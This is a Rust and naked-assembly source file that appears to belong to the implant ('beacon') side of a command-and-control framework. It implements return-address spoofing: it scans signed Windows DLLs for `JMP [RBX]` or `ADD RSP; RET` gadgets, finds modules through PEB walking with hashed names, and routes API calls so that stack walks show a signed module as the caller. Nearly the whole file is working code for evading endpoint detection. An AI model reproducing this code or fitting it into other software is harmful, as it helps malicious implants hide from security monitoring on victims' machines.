//! Return-address spoofing: the beacon-side harness.
//!
//! Everything here is naked assembly — the only untestable surface of the
//! mechanism, kept to two tiny functions and reviewed instruction by
//! instruction.
//!
//! Calling convention walkthrough (Microsoft x64, stack alignment kept):
//!
//! `spt_spoof_call2(api, gadget, cont, arg1, arg2)` entered by `call`:
//!   - RCX = api address, RDX = gadget (a `JMP [RBX]` in a signed DLL),
//!     R8 = continuation address, R9 = arg1, [rsp+8] = arg2 (5th slot).
//!   - entry RSP points at the real return address; RSP ≡ 8 (mod 16).
//!   - the continuation address arrives as a PARAMETER, materialized by
//!     rustc as a rip-relative reference at the (PIC) call site — a `sym`
//!     operand inside the asm would emit an absolute address and break
//!     the position-independence proof (the CI catches exactly that).
//!
//! ```text
//! mov rax, rcx      ; api
//! mov r10, [rsp+8]  ; arg2 (read before the stack is rearranged)
//! push rbx          ; preserve the caller's callee-saved RBX
//! push rdx          ; the gadget becomes the API's return address
//! mov rbx, r8       ; continuation: the gadget jumps here
//! mov rcx, r9       ; arg1
//! mov rdx, r10      ; arg2
//! jmp rax           ; tail-jump: the API sees [rsp] = gadget (signed DLL)
//! ```
//!
//! The stack walk of the API now shows a signed module as its caller. When
//! the API executes `ret`, RIP lands on `JMP [RBX]` inside the signed DLL,
//! which jumps to `spt_retspoof_continue` (RBX is callee-saved, so the
//! continuation address survives the entire API call):
//!
//! ```text
//! spt_retspoof_continue:
//! pop rbx           ; restore the caller's RBX (was pushed below gadget)
//! pop r11           ; the real return address; RSP is now entry+8
//! jmp r11           ; return to the Rust caller, RAX = the API's result
//! ```
//!
//! Alignment: entry RSP ≡ 8; after two pushes RSP ≡ 8 again at the tail-jump
//! — exactly the state the API expects after a `call`.

use core::arch::naked_asm;

use specter_core::fnv::fnv1a64_wide_ascii_ci;

/// Spoofed two-argument API call through a `JMP [RBX]` gadget.
///
/// # Safety
///
/// `gadget` must be the address of a `JMP [RBX]` instruction inside a
/// mapped signed DLL, `api` a valid function of two register arguments, and
/// `cont` the address of `spt_retspoof_continue`.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_spoof_call2(
    api: usize,
    gadget: usize,
    cont: usize,
    arg1: usize,
    arg2: usize,
) -> usize {
    naked_asm!(
        "mov rax, rcx",
        "mov r10, [rsp + 8]",
        "push rbx",
        "push rdx",
        "mov rbx, r8",
        "mov rcx, r9",
        "mov rdx, r10",
        "jmp rax",
    );
}

/// Continuation reached through the gadget's `JMP [RBX]`: restores RBX,
/// returns to the original caller with the API's result in RAX.
///
/// # Safety
///
/// Only ever reached through the gadget from `spt_spoof_call2`.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_retspoof_continue() {
    naked_asm!("pop rbx", "pop r11", "jmp r11",);
}

/// Resolve a return-spoofing gadget: the original project's signed-module
/// list (kernel32, kernelbase, bcrypt, advapi32, user32, iphlpapi — PEB
/// lookups only, absent modules are skipped rather than mapped), each
/// scanned for `JMP [RBX]` first, then for the `ADD RSP, imm8; RET`
/// fallback. The winhttp retry of the original (its gate waits for the
/// transport's lazy load) is not needed: kernel32 always carries `FF 23`
/// on supported Windows, so the list only ever walks past it when something
/// unusual is going on.
///
/// Returns `(address, imm8)`: `imm8 == 0` means the `JMP [RBX]` harness,
/// nonzero the `ADD RSP` one.
///
/// # Safety
///
/// `modules` must be resolved, mapped module bases with intact headers.
pub unsafe fn resolve_gadget(
    peb: *const specter_core::peb::Peb,
    force_addrsp: bool,
) -> Option<(usize, u8)> {
    const H_KERNEL32: u64 = fnv1a64_wide_ascii_ci("kernel32.dll");
    const H_KERNELBASE: u64 = fnv1a64_wide_ascii_ci("kernelbase.dll");
    const H_BCRYPT: u64 = fnv1a64_wide_ascii_ci("bcrypt.dll");
    const H_ADVAPI32: u64 = fnv1a64_wide_ascii_ci("advapi32.dll");
    const H_USER32: u64 = fnv1a64_wide_ascii_ci("user32.dll");
    const H_IPHLPAPI: u64 = fnv1a64_wide_ascii_ci("iphlpapi.dll");
    for hash in [
        H_KERNEL32,
        H_KERNELBASE,
        H_BCRYPT,
        H_ADVAPI32,
        H_USER32,
        H_IPHLPAPI,
    ] {
        let module = specter_core::peb::find_module(peb, hash);
        if module.is_null() {
            continue;
        }
        let Some((text, len)) = specter_core::peb::find_section(module, b".text") else {
            continue;
        };
        let text_bytes = core::slice::from_raw_parts(text, len);
        if !force_addrsp {
            if let Some(off) = specter_core::retspoof::find_jmp_rbx(text_bytes) {
                return Some((text as usize + off, 0));
            }
        }
        if let Some((off, imm)) = specter_core::retspoof::find_add_rsp_ret(text_bytes) {
            return Some((text as usize + off, imm));
        }
    }
    None
}

/// Spoofed two-argument API call through an `ADD RSP, imm8; RET` gadget
/// (`imm ≡ 8 mod 16`, enforced by the scan — see `specter_core::retspoof`).
///
/// ```text
/// ; entry: RCX = api, RDX = gadget, R8 = imm8, R9 = arg1,
/// ;        [rsp+8] = arg2, [rsp] = real return address (RSP ≡ 8 mod 16)
/// mov  rax, rcx          ; api
/// mov  r11, rdx          ; gadget
/// mov  r10, [rsp + 8]    ; arg2 (read before the stack moves)
/// sub  rsp, r8           ; junk zone: the landing stays the ORIGINAL slot
/// push r11               ; fake return address = gadget (in a signed DLL)
/// mov  rcx, r9           ; arg1
/// mov  rdx, r10          ; arg2
/// jmp  rax               ; API entry: [rsp] = gadget, RSP ≡ 8 mod 16
/// ```
///
/// The API's `RET` lands on the gadget with `RSP` back at the junk zone;
/// `ADD RSP, imm8` walks up exactly `imm + 8` bytes — the original return
/// slot — and the gadget's `RET` returns to the real caller with the stack
/// in a normal post-call state. No continuation address and no register
/// survives that the API must preserve: only volatile registers are touched
/// and RBX is never used.
///
/// # Safety
///
/// `gadget` must be the address of an `ADD RSP, imm8; RET` instruction
/// inside a mapped signed DLL with `imm ≡ 8 (mod 16)`, `api` a valid
/// two-argument function, and `imm` the gadget's imm8.
#[unsafe(naked)]
#[unsafe(no_mangle)]
pub unsafe extern "C" fn spt_spoof_call2_addrsp(
    api: usize,
    gadget: usize,
    imm: usize,
    arg1: usize,
    arg2: usize,
) -> usize {
    naked_asm!(
        "mov  rax, rcx",
        "mov  r11, rdx",
        "mov  r10, [rsp + 8]",
        "sub  rsp, r8",
        "push r11",
        "mov  rcx, r9",
        "mov  rdx, r10",
        "jmp  rax",
    );
}
